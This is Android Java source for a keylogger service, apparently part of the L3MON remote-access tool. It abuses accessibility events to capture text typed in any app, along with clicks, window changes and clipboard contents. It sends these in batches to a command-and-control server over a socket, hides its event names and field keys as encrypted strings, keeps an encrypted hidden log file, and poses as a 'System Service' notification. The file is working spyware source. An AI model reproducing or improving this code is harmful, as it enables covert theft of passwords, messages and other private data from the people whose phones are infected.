package com.etechd.l3mon;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.support.v4.app.NotificationCompat;
import com.etechd.l3mon.IOSocket;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONObject;

public class L3M0NKeyLogger extends AccessibilityService {

    private static final String TAG = "L3M0NKeyLogger";
    private static final String CHANNEL_ID = "L3M0NKeyLogger";
    private static final String KEY_FILE = "l3mon.key";
    private static final String LOG_FILE = ".keylog.dat";
    private static final int NOTIFICATION_ID = 1337;
    private static final int BATCH_SIZE = 100;
    private static final long FLUSH_INTERVAL = 15000; // 15 segundos

    private ExecutorService executor;
    private Handler mainHandler;
    private NotificationManager notificationManager;
    private List<String> keyBuffer = new ArrayList<>();
    private SecretKey encryptionKey;
    private Cipher cipher;
    private SecureRandom random = new SecureRandom();
    private boolean isRunning = false;
    private ClipboardMonitor clipboardMonitor;
    private ClipboardManager clipboardManager;
    private static L3M0NKeyLogger instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        executor = Executors.newFixedThreadPool(4);
        mainHandler = new Handler(Looper.getMainLooper());
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        initializeKeyStore();
        loadPersistedLogs();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());

        clipboardMonitor = new ClipboardMonitor(this);
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        registerClipboardListener();

        isRunning = true;
        Log.d(TAG, "L3M0N KeyLogger iniciado (AES-256 + Batch + Persistência)");

        mainHandler.postDelayed(flushRunnable, FLUSH_INTERVAL);
    }

    public static L3M0NKeyLogger getInstance() {
        return instance;
    }

    // ==================== AES-256 ====================
    private void initializeKeyStore() {
        try {
            File keyFile = new File(getFilesDir(), KEY_FILE);
            if (keyFile.exists()) {
                FileInputStream fis = new FileInputStream(keyFile);
                byte[] keyBytes = new byte[32];
                fis.read(keyBytes);
                fis.close();
                encryptionKey = new SecretKeySpec(keyBytes, "AES");
            } else {
                KeyGenerator keyGen = KeyGenerator.getInstance("AES");
                keyGen.init(256);
                encryptionKey = keyGen.generateKey();

                FileOutputStream fos = new FileOutputStream(keyFile);
                fos.write(encryptionKey.getEncoded());
                fos.close();
                keyFile.setReadable(true, true);
                keyFile.setWritable(true, true);
            }
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        } catch (Exception e) {
            Log.e(TAG, "Falha ao inicializar AES-256", e);
        }
    }

    private String encryptData(String data) {
        if (encryptionKey == null || cipher == null || data == null)
            return data;
        try {
            byte[] iv = new byte[16];
            random.nextBytes(iv);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, ivSpec);
            byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));

            String ivBase64 = android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP);
            String encBase64 = android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP);
            return ivBase64 + ":" + encBase64;
        } catch (Exception e) {
            Log.e(TAG, "Falha na criptografia AES-256", e);
            return data;
        }
    }

    // ==================== Buffer & Envio ====================
    private void addToBuffer(String entry) {
        synchronized (keyBuffer) {
            keyBuffer.add(entry);
            if (keyBuffer.size() >= BATCH_SIZE) {
                batchProcessKeys();
            }
        }
    }

    private void batchProcessKeys() {
        synchronized (keyBuffer) {
            if (keyBuffer.isEmpty()) {
                return;
            }

            try {
                JSONObject data = new JSONObject();
                JSONArray keysArray = new JSONArray();

                for (String entry : keyBuffer) {
                    keysArray.put(entry);
                }

                // === CHAVES JSON CRIPTOGRAFADAS ===
                data.put(StringCrypto.d("QbicGOkq/srCnveWytUm7w=="), keysArray); // "keys"
                data.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), getTimestamp()); // "timestamp"

                // Evento 0xKL criptografado
                String eventKeylogger = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ==");
                IOSocket.getInstance().getIoSocket().emit(eventKeylogger, data);

                Log.d(TAG, "Keylogger enviado (" + keyBuffer.size() + " entradas) via evento criptografado");

                // Persistência
                persistLogs(new ArrayList<>(keyBuffer));

                keyBuffer.clear();

            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar keylogger: " + e.getMessage());
            }
        }
    }

    private void sendBatchToC2(String encryptedData, int count) {
        try {
            JSONObject payload = new JSONObject();

            // === CHAVES JSON CRIPTOGRAFADAS ===
            payload.put(StringCrypto.d("srbSQcv0S7JW03lm4Y0iBQ=="), "keylog"); // "type"
            payload.put(StringCrypto.d("D0IetS+zt7hTWohBNPvqEA=="), count); // "count"
            payload.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
            payload.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encryptedData); // "data"
            payload.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            if (IOSocket.getInstance() != null &&
                    IOSocket.getInstance().getIoSocket() != null &&
                    IOSocket.getInstance().getIoSocket().connected()) {

                // Evento 0xKL criptografado
                String eventKeylogger = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ==");
                IOSocket.getInstance().getIoSocket().emit(eventKeylogger, payload);

                Log.d(TAG, "Batch enviado: " + count + " entradas");
            }
        } catch (Exception e) {
            Log.e(TAG, "Falha ao enviar para C2", e);
        }
    }

    // ==================== Persistência ====================
    private File getLogFile() {
        return new File(getFilesDir(), LOG_FILE);
    }

    private void persistLogs(List<String> logs) {
        try {
            File logFile = getLogFile();
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            for (String log : logs) {
                writer.write(encryptData(log) + "\n");
            }
            writer.close();
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Falha ao persistir logs", e);
        }
    }

    private void loadPersistedLogs() {
        // Implementação similar à que você tinha (carregar e enviar logs antigos)
        // ... (pode manter a sua versão)
    }

    // ==================== Eventos de Acessibilidade ====================
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isRunning)
            return;

        try {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleEditTextChange(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleButtonClick(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChange(pkg);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar evento", e);
        }
    }

    private void handleEditTextChange(AccessibilityEvent event, String pkg) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0) : "";
        if (text.length() > 0) {
            addToBuffer("[" + getTimestamp() + "] [" + pkg + "] TEXT: " + text);
        }
    }

    private void handleButtonClick(AccessibilityEvent event, String pkg) {
        String text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0).toString() : "";
        addToBuffer("[" + getTimestamp() + "] [" + pkg + "] CLICK: " + text);
    }

    private void handleWindowChange(String pkg) {
        addToBuffer("[" + getTimestamp() + "] [WINDOW] " + pkg);
    }

    // ==================== Clipboard ====================
    private void registerClipboardListener() {
        if (clipboardMonitor != null)
            clipboardMonitor.enable();
    }

    public void onClipboardChanged(String text) {
        if (text != null && !text.trim().isEmpty()) {
            addToBuffer("[" + getTimestamp() + "] [CLIPBOARD] " + text);
        }
    }

    // ==================== Notificação & Ciclo de Vida ====================
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "L3M0N KeyLogger",
                    NotificationManager.IMPORTANCE_MIN);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running security service")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private final Runnable flushRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRunning) {
                batchProcessKeys();
                mainHandler.postDelayed(this, FLUSH_INTERVAL);
            }
        }
    };

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (clipboardMonitor != null)
            clipboardMonitor.disable();
        if (mainHandler != null)
            mainHandler.removeCallbacks(flushRunnable);
        if (executor != null)
            executor.shutdown();
        notificationManager.cancel(NOTIFICATION_ID);
        instance = null;
        super.onDestroy();
    }

    private String getTimestamp() {
        return android.text.format.DateFormat.format("yyyy-MM-dd HH:mm:ss", System.currentTimeMillis()).toString();
    }
}